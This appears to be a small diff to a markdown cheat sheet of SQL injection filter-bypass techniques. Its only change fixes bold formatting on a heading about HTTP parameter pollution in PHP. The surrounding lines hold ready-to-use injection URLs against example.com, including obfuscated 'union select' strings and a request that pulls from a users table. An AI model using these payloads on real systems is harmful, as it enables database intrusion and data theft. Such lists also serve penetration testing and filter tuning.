@@ -2448,7 +2448,7 @@ http://example.com/news.php?id=-1+uni*on+sel*ect+1,2,3,4–+-
 http://example.com/news.php?id=-1+%0A%0Dunion%0A%0D+%0A%0Dselect%0A%0D+1,2,3,4,5 —
 ```
 
-**9. HTTP Parameter Pollution (PHP)
+**9. HTTP Parameter Pollution (PHP)**
 
 ```bash
 http://example.com/news.php?id=1;select+1&id=2,3+from+users+where+id=1–
